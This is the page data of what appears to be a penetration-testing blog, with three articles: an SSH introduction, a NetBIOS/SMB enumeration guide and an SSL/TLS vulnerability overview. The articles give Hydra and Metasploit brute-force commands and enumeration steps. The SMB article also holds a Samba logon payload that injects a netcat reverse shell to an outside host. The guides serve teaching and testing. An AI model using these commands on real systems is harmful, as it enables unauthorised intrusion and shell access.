{"componentChunkName":"component---src-templates-blog-post-js","path":"/articles/linux-security-secure-shell-ssh-introduction/","result":{"pageContext":{"post":{"fields":{"slug":"/linux-security-secure-shell-ssh-introduction"},"excerpt":null,"frontmatter":{"date":"27th January 2022 ","title":"Linux Security :- Secure Shell (SSH) Introduction","description":"This article serves as an introduction to the Secure Shell (SSH) protocol for Linux users. When you need to connect to Linux servers remotely, SSH is the most commonly used method. SSH provides a text interface by spawning a remote shell. All commands entered in your local terminal are sent to the remote server and executed there.","tags":"linux, ssh","posttype":"article"},"body":"\n###What is SSH?\n\nSSH, or Secure Shell, is a \"tried and tested\" protocol that has been in use since 1995. The SSH protocol allows remote servers to be controlled and modified securely, even over insecure networks. This is accomplished through a text interface, which accepts input from your local terminal and sends it to the remote server for execution; All the while providing encryption for the communication exchanged.\n\n###SSH enumeration with Linux\n\nObtaining information from running services is used by penetration testers during the enumeration phase of an engagement to gain insight into the target(s) under review. We can ascertain the following from the SSH protocol:\n  \n* SSH package version - You might be able to find the operating system and version.  \n* SSH key fingerprint - Has the key been re-used somewhere (Another machine? Same machine, just another port/service?).  \n* SSH banner - Any text (if at all) before the password prompt (often get legal warnings about connecting to it).\n\nLet us look into acquiring this information with our Linux-based machine.\n\n#### Server version\n\nSSH operates on a client-server architecture. In this architecture, the host being accessed acts as an SSH server, while the host connecting the server acts as an SSH client. Both these utilise the SSH protocol with the help of software; The most common of which is the OpenSSH package for Linux-based systems. \n\nTo find out the SSH server software and its version in use, we can use netcat.\n\n```\nnc 10.0.0.1 22\n\nSSH-2.0-OpenSSH_8.4p1 Debian-6\n```\n\n#### Fingerprinting\n\nSSH keys provide access without the need for passwords. They consist of public and private key pairs, which act as means to encrypt and decipher data exchanged. \n\nPublic keys can also be used to verify the identity of the offering party. A hash obtained from the public key, is also known as fingerprint. SSH servers display their fingerprints to users when they first connect to the server, or the public key of the server has changed since the last time a connection was initiated. \n\nTo obtain the fingerprint of a server, you can use the SSH client on Linux.\n\n```\nroot@kali:~# ssh root@10.11.1.71  \n\n\nThe authenticity of host '10.11.1.71 (10.11.1.71)' can't be established.  \nECDSA key fingerprint is SHA256:AibCWx1KvdJmNHd3KVsYksWtveJPdLZAsHMIChsTeHE.  \nAre you sure you want to continue connecting (yes/no)?  \n```\n\n#### SSH Banner\n\nBefore allowing authentication, the SSH server can display a pre-configured message to its users. If an SSH banner is configured, you can see it while fingerprinting the server as described above.\n\n#### Nmap\n\nNmap is a network mapping tool that is an essential part of every penetration tester's arsenal. The installation comes with Nmap Scripting Engine (NSE), which allows users to write and share network enumeration scripts. These scripts are most typically located at /usr/share/nmap on Linux machines.\n\nTo view which SSH scripts are available with your version of nmap, use `ls` . \n\n```\nbash  \nroot@root:~/# ls -ls /usr/share/nmap/scripts/*ssh*\n8 -rw-r--r-- 1 root root 5659 Sep 2 2016 /usr/share/nmap/scripts/ssh2-enum-algos.nse  \n16 -rw-r--r-- 1 root root 15363 Sep 2 2016 /usr/share/nmap/scripts/ssh-hostkey.nse  \n4 -rw-r--r-- 1 root root 1446 Sep 2 2016 /usr/share/nmap/scripts/sshv1.nse`  \n```\n\nThe nmap host key script allows fingerprinting and banner grabbing across the network.\n\n```\nnmap 192.168.1.0/24 -p 22 -sV --script=ssh-hostkey  \n\n[...]\n| ssh-hostkey: Possible duplicate hosts\n| Key 1024 60:ac:4d:51:b1:cd:85:09:12:16:92:76:1d:5d:27:6e (DSA) used by:\n|   192.168.1.1\n|   192.168.1.2\n| Key 2048 2c:22:75:60:4b:c3:3b:18:a2:97:2c:96:7e:28:dc:dd (RSA) used by:\n|   192.168.1.1\n|_  192.168.1.2\n```\n\n#### Hydra\n\nSSH servers can be configured to support password authentication. This means that upon connecting, a username and password are required for the user to log in. Unlike key-based authentication, password authentication exposes the server brute force password attacks.\n\nHydra is a tool for performing brute force attacks on SSH. These attacks can be set to use a word list, a password list, or a host list.\n\nSeveral hosts with a username and a password list:\n\n```\nhydra -L /usr/share/ncrack/default.usr  -P /usr/share/wordlists/rockyou.txt -M hosts.txt ssh\n```\n\nOne host with a password list against a single user (\"root\"):\n\n```\nhydra -l root -P /usr/share/wordlists/rockyou.txt 10.1.1.1 ssh\n```\n\nHydra flags:\n\n```bash  \n-M = (FILE) server list for parallel attacks, one entry per line  \n-e nsr = \"n\" null password, \"s\" try login as pass, \"r\" try pass as login  \n-s = (PORT) if the service is on a different default port, define it here  \n-l or -L = single username login or username from FILE  \n-p or -P = single password login or password from FILE  \n```\n\n#### Word lists  \n\nThe success rate of a brute force attack is only as high as the quality of the word list used. Word lists should be chosen with the basis of information gathered within the enumeration phase. For example, attacking the \"root\" username on a Windows-based SSH server is less likely to grant access than attacking it on a Linux-based SSH server.\n\nMulti-purpose username lists:\n\n```\n/usr/share/ncrack/default.usr  \n\n/usr/share/metasploit-framework/data/wordlists/default_users_for_services_unhash.txt  \n```\n\nThe most 14344392 popular passwords from a breached password database collection:\n\n```\n/usr/share/wordlists/rockyou.txt  \n```\n\n### About SSH keys  \n  \nSSH keys are a more secure way of logging into a server with SSH than a password alone. As we have uncovered earlier, a brute force attack can eventually crack a password; However, it is nearly impossible to decipher SSH keys with brute force alone. \n\nWhen generating a key pair, you will end up with two long strings of characters: a public and a private key. You can put the public key on any server and then unlock it by connecting with a client that has the private key. When the two match, the system unlocks without requiring a password. You can boost security even further by encrypting the private key with a password.\n\n#### How to set up SSH keys \n\n<https://www.digitalocean.com/community/tutorials/how-to-set-up-ssh-keys--2>  \n  \nIn case of key-based authentication, the SSH connection requires two key pairs:\n\n* Your client software compares the server's (host) public key to data encrypted with the host private key. This necessitates having a copy of the server's public key, which you are given at the first connection and which your client stores if you approve of it.\n* The server verifies your authentication data, which is encrypted with your user private key, using a copy of your user public key that it has because you placed it there (or had someone put there for you).\n  \n#### Step One - Create the RSA key pair  \n  \nThe first step is to create the key pair on the client machine (which is likely just your computer):\n  \n```\nssh-keygen -t rsa  \n```\n\n#### Step Two - Store the keys and passphrase  \n  \nOnce you have entered the Gen Key command, you will get a few more questions:  \n  \n```\nEnter file in which to save the key (/home/demo/.ssh/id_rsa):  \n```\n  \nYou can press enter here, saving the file to the user's home (in this case, my example user is called demo). \n\nNext, you will be prompted for a passphrase.\n  \n```\nEnter passphrase (empty for no passphrase):  \n```\n\nIt is entirely up to you whether or not to use a passphrase. Entering a passphrase has advantages: the security of a key, no matter how encrypted, is still dependent on the fact that it is not visible to others. If an unauthorised user obtains a pass-protected private key, they will be unable to log in to the accounts associated with it until they figure out the passphrase, buying the hacked user some time. The only disadvantage of having a passphrase is having to type it in each time you use the key pair.\n  \nThe entire key generation process looks like this:  \n\n```bash  \nssh-keygen -t rsa  \nGenerating public/private rsa key pair.  \nEnter file in which to save the key (/home/demo/.ssh/id_rsa):  \nEnter passphrase (empty for no passphrase):  \nEnter same passphrase again:  \nYour identification has been saved in /home/demo/.ssh/id_rsa.  \nYour public key has been saved in /home/demo/.ssh/id_rsa.pub.  \nThe key fingerprint is:  \n4a:dd:0a:c6:35:4e:3f:ed:27:38:8c:74:44:4d:93:67 demo@a  \nThe key's randomart image is:  \n+--[ RSA 2048]----+  \n| .oo. |  \n| . o.E |  \n| + . o |  \n| . = = . |  \n| = S = . |  \n| o + = + |  \n| . o + o . |  \n| . o |  \n| |  \n+-----------------+  \n  \nThe public key is now located in /home/demo/.ssh/id_rsa.pub The private key (identification) is now located in /home/demo/.ssh/id_rsa  \n```\n\n#### Step Three - Copy the public key  \n\nOnce the key pair has been generated, the public key should be placed on the server that we intend to use.\n  \nUsing the ssh-copy-id command, you can copy the public key into the new machine's authorized_keys file. Replace the example username and IP address below with your own.\n  \n```\nssh-copy-id user@10.1.1.1\n```\n\nAlternatively, you can paste in the keys using SSH:  \n  \n```\ncat ~/.ssh/id_rsa.pub | ssh user@10.1.1.1 \"mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys\"  \n```\n\nNo matter which command you use, you should see something like this:  \n\n```  \nThe authenticity of host '10.1.1.1 (10.1.1.1)' can't be established.  \nRSA key fingerprint is b1:2d:33:67:ce:35:4d:5f:f3:a8:cd:c0:c4:48:86:12.  \nAre you sure you want to continue connecting (yes/no)? yes  \nWarning: Permanently added '10.1.1.1' (RSA) to the list of known hosts.  \nuser@12.34.56.78's password:  \n```\n\nYou can now log in to user@10.1.1.1 without being prompted for a password. However, if you set a password, you will be prompted to enter it at that time (and every time you log in in the future). \n\n#### Optional Step Four -Disable the password for root login  \n  \nOnce you have copied your public key to the server and confirmed that you can log in using just the SSH keys, you can restrict root login to SSH keys only.\n\nTo do this, open the SSH configuration file:\n\n```\nsudo nano /etc/ssh/sshd_config  \n```\n\nFind the line that includes PermitRootLogin and change it to ensure that users can only connect using their SSH key:\n\n```\nPermitRootLogin without-password  \n```\n\nPut the changes into action:\n\n```\nreload ssh\n```"},"prev":{"fields":{"slug":"/protocol-dissection-net-bios-and-smb"},"excerpt":null,"frontmatter":{"date":"28th January 2022 ","title":"Protocol Dissection :- NetBIOS & SMB","description":"This article examines the two protocols NetBIOS and SMB. SMB ran on top of the NetBIOS protocol in early versions of Windows, but eventually moved to its own dedicated TCP port. While NetBIOS is the older protocol, understanding both is nearly essential for understanding Windows network communications. The SMB protocol enables networked computers' applications and services to communicate via Inter Process Communication (IPC) and to share files.","tags":"netbios, smb","posttype":"article"},"body":"##What is NetBIOS?\n\nNetBIOS is an acronym for Network Basic Input/Output System. It provides services related to the session layer of the OSI model, allowing applications on separate computers to communicate over a local area network. \n  \nNetBIOS is an API and not a networking protocol.  \n\n##How does NetBIOS operate?\n  \nOlder operating systems ran NetBIOS using the NetBIOS Frames (NBF) and NetBIOS over IPX/SPX (NBX) protocols.  \n  \nIn modern networks, NetBIOS normally runs over TCP/IP via the NetBIOS over TCP/IP (NBT) protocol. This results in each computer in the network having both an IP address and a NetBIOS name corresponding to a (possibly different) host name.  \n\n##What are the benefits of NetBIOS?\n  \nNetBIOS provides three distinct services:  \n  \n* Name service (NetBIOS-NS) for name registration and resolution.  \n* Datagram distribution service (NetBIOS-DGM) for connectionless communication.  \n* Session service (NetBIOS-SSN) for connection-oriented communication.  \n\n##What is SMB?\n  \nN.B. SMB, an upper layer, is a service that runs on top of the Session Service and the Datagram service, and is not to be confused as a necessary and integral part of NetBIOS itself. It can now run atop TCP with a small adaptation layer that adds a packet length to each SMB message; this is necessary because TCP only provides a byte-stream service with no notion of packet boundaries  \n\n##How does SMB operate?\n  \nSMB can run on top of the Session (and lower) network layers in several ways:  \n  \n* Directly over TCP, port 445  \n* Via the NetBIOS API on UDP ports 137, 138 &amp; TCP ports 137, 139 (NetBIOS over TCP/IP);  \n\n##What are the benefits of SMB?\n\nThe SMB \"Inter-Process Communication\" (IPC) system provides named pipes and was one of the first inter-process mechanisms widely available to programmers, allowing services to inherit the authentication performed when a client first connected to an SMB server. \n  \nSince Windows 2000, SMB has been running with a thin layer on top of TCP, similar to the Session Message packet of NBT's Session Service, using TCP port 445 rather than TCP port 139; this is known as \"direct host SMB.\" \n  \n## SMB Versions\n\n### Version Summary:  \n\n* SMB1 – Windows 2000, XP and Windows 2003.  \n* SMB2 – Windows Vista SP1 and Windows 2008  \n* SMB2.1 – Windows 7 and Windows 2008 R2  \n* SMB3 – Windows 8 and Windows 2012.  \n\n### SMB 2.0\n\nMicrosoft introduced a newer version of the protocol (SMB 2.0 or SMB2) with Windows Vista in 2006  \n\n### SMB 2.1\n\nWith Windows 7 and Server 2008 R2, a new opportunistic locking mechanism was introduced, resulting in minor performance improvements. \n  \n### SMB 3.0 (previously SMB 2.2)\n\nWas introduced with Windows 8 and Windows Server 2012.  \n  \n### SMB 3.0.2 \n\nIntroduced with Windows 8.1 and Windows Server 2012 R2. In 3.0.2, the earlier SMB version 1 can be optionally disabled to increase security.\n   \n### SMB 3.1.1 \n\nDebuted alongside Windows 10 and Windows Server 2016. This version adds AES 128 GCM encryption to the AES 128 CCM encryption introduced in SMB3, as well as a pre-authentication integrity check using the SHA-512 hash. SMB 3.1.1 also requires secure negotiation when connecting to clients that use SMB 2.x or higher. \n\n## Security Flaws Windows  \n\nThere have been numerous security flaws in Microsoft's implementation of the protocol or the components on which it directly relies over the years.\nOther vendors' security flaws stem primarily from a lack of support for newer authentication protocols such as NTLMv2 and Kerberos in favour of NTLMv1, LanMan, or plaintext passwords. Real-time attack tracking reveals that SMB is a primary attack vector for intrusion attempts, such as the Sony Pictures attack in 2014.  \n  \nNetBIOS is effectively becoming a legacy protocol in client-server networks based on post-MS Windows 2000 / NT. NetBIOS was also designed for non-routable local area networks. NetBIOS effectively provides backwards compatibility for network devices that predate DNS compatibility in most post-2000 networks running Windows 2000 or later. NetBIOS's primary role in Client-Server networks (as well as those with networked peripheral hardware that predates DNS compatibility) is to provide name resolution to computers and networked peripherals. Furthermore, it enables the access and sharing of networked hardware, as well as the mapping and browsing of network folders, shares, and shared printers, faxes, and so on. Its primary function is to provide name resolution to a computer and shared folders via a session-layer protocol transported over TCP/IP. As a result, Windows 2000-based Client-Server networks - and later - do not require this insecure method of name resolution, addressing, or navigating network shares. \n  \n## Security Flaws in Samba:  \n\nSome versions of Samba 3.6.3 and lower have serious security flaws that can allow anonymous users to gain root access to a system via an anonymous connection by exploiting an error in Samba's remote procedure call.\n\nBadlock, a critical security flaw in Windows and Samba, was publicly disclosed on April 12, 2016. CVE-2016-2118 mentions Badlock for Samba (SAMR and LSA person-in-the-middle attacks are possible). \n  \n  \n## Null Sessions\n  \n* In Windows 2000 and Windows NT, null sessions are enabled by default.\n* They are also enabled by default in Windows XP and Windows 2003 Server, but they do not support user account enumeration. \n  \n## SMB Programs \n\nsmbcacls - Set or get ACLs on an NT file or directory names  \n```  \n/usr/bin/smbcacls  \n```\n\nsmbclient - ftp-like client to access SMB/CIFS resources on servers    \n```\n/usr/bin/smbclient\n```\n  \nsmbcontrol - send messages to smbd, nmbd or winbindd processes  \n```  \n/usr/bin/smbcontrol  \n```  \n\nsmbcquotas - Set or get QUOTAs of NTFS 5 shares  \n```  \n/usr/bin/smbcquotas  \n```  \n\nsmbget - wget-like utility for download files over SMB  \n```  \n/usr/bin/smbget  \n/usr/bin/smbmap  \n```  \n\nsmbpasswd - The Samba encrypted password file  \nsmbpasswd - change a user's SMB password  \n```\n/usr/bin/smbpasswd  \n```\n  \nsmbspool - send a print file to an SMB printer  \n```  \n/usr/bin/smbspool  \n```  \n\nsmbstatus - report on current Samba connections  \n```  \n/usr/bin/smbstatus  \n```  \n\nsmbtar - smbtar - shell script for backing up SMB/CIFS shares directly to UNIX tape drives  \n```  \n/usr/bin/smbtar  \n```  \n\nsmbtree - A text based smb network browser  \n```  \n/usr/bin/smbtree  \n```  \n\nOthers: \n``` \n/usr/bin/dceoversmb   \n/usr/bin/pth-smbclient  \n/usr/bin/pth-smbget  \n```\n\n## Smbtree\n\nShow smbtree version  \n```\nsmbtree --version  \n```\n\nShow all workgroups  \n```\nsmbtree  \n```\n\n## Nbtscan vs Nbtstat\n\nThe difference between nbtstat and nbtscan in Windows is that nbtscan can work with multiple IP addresses.\n\nTo determine the meaning of each service in the NetBIOS report, visit Microsoft Knowledge Based on NetBIOS Suffixes (16th Character of the NetBIOS Name) at: \n\n* https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-brws/0c773bdd-78e2-4d8b-8b3d-b7506849847b\n\n### Nbtscan\n\nnbtscan is an abbreviation for 'NetBIOS over TCP scanner. \n\nThis is a command-line tool that searches for open NetBIOS nameservers on a local or remote TCP/IP network, which is the first step in discovering open shares. It is based on the functionality of the standard Windows tool nbtstat, but instead of just one address, it operates on a range of addresses. \n\n#### Scanning the network\n\nThis scan will return the IP address of the computer(s), the NetBIOS name, the current logged in user, and the mac address of all NetBIOS on the local subnet. \n\n```\nnbtscan 10.11.1.1-254\nnbtscan 110.11.1.0/24\n```\n\n#### Examining one host\n\nOnce we have decided on a host, we can enter just one host for more information. \n```\nnbtscan -hv 10.11.1.5\n```\n\nThe `-h` makes the output services human-readable and the `-v` gives a verbose output.\n\nIf instead you would like to see a dump of the packets you can use the `-d` option but it **can not** be used with the `-v` or `-d`.\n```\nnbtscan -d 10.11.1.5\n```\n\nSometimes you may want to grep the results and so the -s flag can come in handy to put a separator between the fields.\n\nPipe as a separator:\n```\nnbtscan -vh -s \"|\" 10.11.1.0/24\n```\n\nColon as a separator:\n```\nnbtscan -vh -s : 192.168.1.0/24\n```\n\nFinally, we may want to enter the IP addresses of hosts to scan, which we can do as follows. \n```\nnbtscan -f iplist.txt\n```\n\n#### Additional Flags\n\nAs per the man page, the following three flags sometimes can be useful.\n\nBandwidth output throttling. Slow down output so that it uses no more that bandwidth bps. Useful on slow links, so that outgoing queries do not get dropped.\n```\nnbtscan -b 1000 10.11.1.5\n```\n\nUse local port 137 for scans. Win95 boxes respond to this only. You need to be root to use this option on Unix.\n```\nnbtscan -r 10.11.1.0/24\n```\n\nSuppress banners, headers and error messages.\n```\nnbtscan -q 10.11.1.0/24\n```\n\n## Nmblookup\n\nUse this on a single IP address for greater detail following the nbtscan.\n\nDo a node status on <name> as an IP address:\n```\nnmblookup -A <ip address>\n```\n\nTo find the IP address of a computer given its computer name, we can use:\n```\nnmblookup <computer name>\n```\n\nTo find the group the computer belongs to and its MAC address:\n```\nnmblookup -S <computer name>\n```\n\nFor example, lines containing '<00>' in the output of 'nmblookup -S <computer name>' can be interpreted as follows. The one that is not followed by group is the computer name, and the one that is is the workgroup name to which this computer belongs. \n\nTo find IP addresses of all computers in a workgroup, we can use:\n```\nnmblookup <workgroup name>\n```\n\nIf we want computer names along with IP addresses, then we can use:\n```\nnmblookup -S <workgroup name>\n```\n\n### Workgroup Flags\n\n* workgroup `<00>` group - This name is a remnant of the original LAN Manager browse service.\n* workgroup `<1D>` unique - This name identifies the Local Master Browser (LMB, sometimes called simply \"Master Browser\") for a subnet.\n* workgroup `<1E>` -  group A node that is capable of acting as a \"Browser\" registers this group name to listen for election announcements.\n* nt_domain `<1B>` unique Name registered by the Domain Master Browser. Must be registered with the NBNS in order to be of any real use.\n* nt_domain `<1C>` Internet group Registered by all Domain Controllers in the given NT Domain.\n\n## Nmap\n\nNmap scripts for SMB are located at:\n```\nls -l /usr/share/nmap/scripts/smb*\nls -lsa /usr/share/nmap/scripts | grep \"smb\"\nls /usr/share/nmap/scripts | grep \"smb\" | sed \"s/.nse/,/\" | tr -d \"\\n\\r\"\n```\n\nThe below scripts are available to us.\n```\nsmb-brute,smb-enum-domains,smb-enum-groups, smb-enum-processes,smb-enum-sessions,smb-enum-shares,smb-enum-users,\nsmb-flood,smb-ls,smb-mbenum, smb-os-discovery,smb-print-text,smb-psexec, smb-security-mode,smb-server-stats\nsmb-system-info,smbv2-enabled,smb-vuln-conficker,smb-vuln-cve2009-3103,smb-vuln-ms06-025,smb-vuln-ms07-029\nsmb-vuln-ms08-067, smb-vuln-ms10-054,smb-vuln-ms10-061,smb-vuln-regsvc-dos\n```\n\nWe start off by seeing which SMB ports are open (the `--open` switch is used in order to show only open ports).\n```\nnmap -p 139,445 192.168.1.0/24 --open\n```\n\nWe can also do basic SMB Vulnerability Checking.\n```\nnmap -p T:137,139,445,U:137,139,445 --script=vulns --script-args=unsafe=1 192.168.1.111\n```\n\n### Discover network shares with Nmap\n\nAfter a list of shares is found, the script attempts to connect to each of them anonymously, which divides them into \"anonymous\", for shares that the NULL user can connect to, or \"restricted\", for shares that require a user account.\n\n* https://nmap.org/nsedoc/scripts/smb-enum-shares.html\n\nUse the smb-os-discovery.nse script to discover NetBIOS computer name. The reason for this is that a computer named maria-pc, most likely to have a user named maria, so you can use it during brute forcing phase.\n```\nnmap --open -sS -sV --script smb-enum-shares.nse,smb-os-discovery.nse -p445,139 10.11.1.1/24\n```\n\n## Enum4linux\n\nEnum4linux is a wrapper for smbclient, rpcclient, net and nmblookup.\n\n* http://labs.portcullis.co.uk/tools/enum4linux/\n\nVerbose mode, shows the underlying commands being executed by enum4linux and is a great way to learn what the tool is running behind the scenes.\n```\nenum4linux -v <target-ip>\n```\n\nDo Everything, runs all options apart from dictionary based share name guessing. (-U -S -G -P -r -o -n -i). This opion is enabled if you don't provide any other options.\n```\nenum4linux -a <target-ip>\n```\n\nLists usernames, if the server allows it - (RestrictAnonymous = 0).\n```\nenum4linux -U <target-ip>\n```\n\nIf you have managed to obtain credentials, you can pull a full list of users regardless of the ‘RestrictAnonymous’ option.\n```\nenum4linux -u administrator -p password -U <target-ip>\n```\n\nPulls usernames from the default RID range (500-550,1000-1050).\n```\nenum4linux -r <target-ip>\n```\n\nPull usernames using a custom RID range.\n```\nenum4linux -R 600-660 <target-ip>\n```\n\nLists groups. if the server allows it, you can also specify username -u and password -p.\n```\nenum4linux -G <target-ip>\n```\n\nList Windows shares, again you can also specify username -u and password -p\n```\nenum4linux -S <target-ip>\n```\n\nPerform a dictionary attack, if the server does not let you retrieve a share list\n```\nenum4linux -s shares.txt <target-ip>\n```\n\nPulls OS information using smbclient, this can pull the service pack version on some versions of Windows\n```\nenum4linux -o <target-ip>\n```\n\nPull information about printers known to the remove device.\n```\nenum4linux -i <target-ip>  \n```\n\n## Rpcclient\n\nConnect to anonymous SMB\n```\nroot@kali:~# rpcclient -U \"\" 10.20.50.80\n```\n\nEnumerate domain users\n```\nrpcclient $> enumdomusers\nuser:[nobody] rid:[0x1f5]\nuser:[user] rid:[0x3e8]\nuser:[root] rid:[0x3e9]\n```\n\nConvert names to SIDs\n```\nrpcclient $> lookupnames root\nroot S-1-5-21-2814459928-1332494333-2211073762-1001 (User: 1)\n```\n\nConvert SIDs to names\n```\nrpcclient $> lookupsids S-1-5-21-2814459928-1332494333-2211073762-1001\n```\n\nQuery user info\n```\nrpcclient $> queryuser 1001\n```\n\n## Metasploit\n\nBrute Force SMB Login\n```bash\nmsfconsole\nuse auxiliary/scanner/smb/smb_login\nset RHOSTS 192.168.1.5\nset SMBUser administrator\nset PASS_FILE /root/Documents/passwords_list\nset THREADS 10\nrun\n```\n\n### Metasploit Module\n\nThe pipe_auditor scanner will determine which named pipes are available over SMB. This can provide you with some insight into some of the services that are running on the remote system during your information gathering stage.\n\n```\nmsf> use scanner/smb/pipe_auditor\n```\n\n## Smbclient\n\nThe -N switch indicates that we do not have a root password for this connection.\n```\nsmbclient -L 192.168.75.14 -N\n```\n\nThe above might show us the Samba or Windows server version that we can look in exploit DB.\n\nThis allows us to login to shares.\n```\nsmbclient //host/share\n```\n\nMount discovered share\n```\nsmbclient //MOUNT/share -I target -N\n```\n\nList the contents of a share\n```\nsmbclient -L \\\\RALPH -I 10.11.1.31 -N\nsmbclient -L \\\\MAILSLOT\\Browser -I 10.11.1.218 -N  \n```  \n  \n## Mounting SMB Shares (`mount`)\n\nWhen mounting Windows shares, we need to use cifs as the filesystem type. To do this, our first step is to download the cifs-utilities.\n```\napt-get install cifs-utils\n```\n\nAfter that, we can create a directory in which we want to mount our share. For example, we could install it in the /tmp/ or /mnt/ drives. \n```\nmkdir /tmp/myshare\n```\n\nWe can then mount this directly using the following two options. N.B. The difference is that mount.cifs is a wrapper for mount.\n```\nmount -t cifs //10.11.1.31/wwwroot /mnt/myshare\nmount.cifs //10.11.1.31/wwwroot /mnt/myshare\n```\n\nPassing in options\n```\nmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw\n```\n\nTo unmount a particular share, you have two options. You can either \n\na) navigate to the share on your local system and run\n```\numount -A\n```\n\nOr\n\nb) you can run the same command with the path following from any directory\n```\numount -A /tmp/\n```\n\nTo get a shell back from an SMB share.\n```\nlogon \"/=`nc 10.11.0.233 443 -e /bin/bash`\"\n```\n\n## smb4k\n\nTo install\n```\napt-get install smb4k -y\n```\n\nTo Run\n```\nsmb4k\n```\n\n## Smbmap\n\nList all shares\n```\nsmbmap -H 10.11.1.2\n```\nRecursively view all files inside a share named share\n```\nsmbmap -H 10.11.1.2 -r \"share\"\n```\n  \n## Pass The Hash  \n  \nMore To Come :-)"},"next":{"fields":{"slug":"/vulnerabilities-in-ssl-and-tls-overview"},"excerpt":"Since January 6th, we have been looking at individual SSL/TLS vulnerabilities. This article will provide an overview of the series and…","frontmatter":{"date":"24th January 2022 ","title":"Vulnerabilities in SSL & TLS :- Overview","description":"Since January 6th, we have been looking at individual SSL/TLS vulnerabilities. This article will provide an overview of the series and provide background information on SSL/TLS for those who are unfamiliar with the subject. If you scroll to the bottom, you will find a handy reference sheet for when you are on the phone with customers.","tags":"ssl, tls","posttype":"article"},"body":"Since January 6th, we have been looking at individual SSL/TLS vulnerabilities. This article will provide an overview of the series and provide background information on SSL/TLS for those who are unfamiliar with the subject. \n\nA timeline of SSL and TLS development:\n\n- SSL 2.0. Released in 1995, this version of SSL is now prohibited by the Internet Engineering Task Force (see RFC-6176).\n- SSL 3.0. Released in 1996, SSL 3.0 is deprecated, but a few browsers still support it (RFC-7568).\n- TLS 1.0. Released in 1999 and deprecated in 2020.\n- TLS 1.1. Released in 2006 and deprecated in 2020.\n- TLS 1.2. Released in 2008 and still has no security issues.\n- TLS 1.3. Released in 2018 and continues to be the main protocol used today without any known vulnerabilities.\n\nIn this article series we will cover:\n\n1. [Heartbleed](https://evilsaint.com/article/vulnerabilities-ssl-tls-heartbleed/) \n2. [SWEET32](https://evilsaint.com/article/vulnerabilities-ssl-tls-sweet32/) \n3. [DROWN](https://evilsaint.com/article/vulnerabilities-ssl-tls-drown/) \n4. [FREAK](https://evilsaint.com/article/vulnerabilities-ssl-tls-freak/) \n5. [logjam](https://evilsaint.com/article/vulnerabilities-ssl-tls-logjam/) \n6. [BEAST](https://evilsaint.com/article/vulnerabilities-ssl-tls-beast/) \n7. [BREACH](https://evilsaint.com/article/vulnerabilities-ssl-tls-breach/) \n8. [RC4 Biases](https://evilsaint.com/article/vulnerabilities-ssl-tls-rc4-byte-biases/) \n9. [CCS injection vulnerability](https://evilsaint.com/article/vulnerabilities-ssl-tls-ccs-injection-vulnerability/) \n10. [POODLE](https://evilsaint.com/article/vulnerabilities-ssl-tls-poodle/) \n11. [POODLE over TLS](https://evilsaint.com/article/vulnerabilities-ssl-tls-poodle-over-tls/) \n12. [Lucky13](https://evilsaint.com/article/vulnerabilities-ssl-tls-lucky13/) \n13. [TLS Renegotiation](https://evilsaint.com/article/vulnerabilities-ssl-tls-tls-renegotiation/) \n\n\n## Quick Guide\n\nRight now, if you have the client on the phone, however...\n\nAttack | CVE | Affects | Mitigation \n:-----:|:-----:|:-----|:-----\nLogjam | CVE-2015-4000 | The TLS protocol 1.2 and earlier when a DHE_EXPORT cipher suite is enabled. | Enforce DH group sizes of 1,024 bits and above\nPOODLE | CVE-2014-3566 | SSL version 3.0 | Disable support for SSL 3.0\nBEAST | CVE-2011-3389  | TLS 1.0 or any version of SSL | Enforce TLS 1.1 and higher\nCRIME | 2012-4929  | TLS compression| Disable TLS compression\nBREACH and TIME | CVE-2013-3587 | HTTP compression | Disable HTTP compression\nLucky 13 | CVE-2013-0169 | TLS protocol 1.1 and 1.2 and the DTLS protocol 1.0 and 1.2 in several vendors products | Disable CBC ciphers if your server implementation is flawed\nRC4 byte biases | CVE-2013-2566  | Connections supporting RC4 | Disable support for RC4 cipher suites\nFREAK | CVE-2015-0204  | Any system willing to negotiate RSA Export Keys.  | Disable support for weak export-grade ciphers\nSWEET32 | CVE-2016–2183 and CVE-2016–6329 | Long term client browser foothold | Do not support or negotiate 3DES cipher-suites. At a minimum, AES should be preferred over 3DES. Limit length of TLS session."}}},"staticQueryHashes":["310218920"],"slicesMap":{}}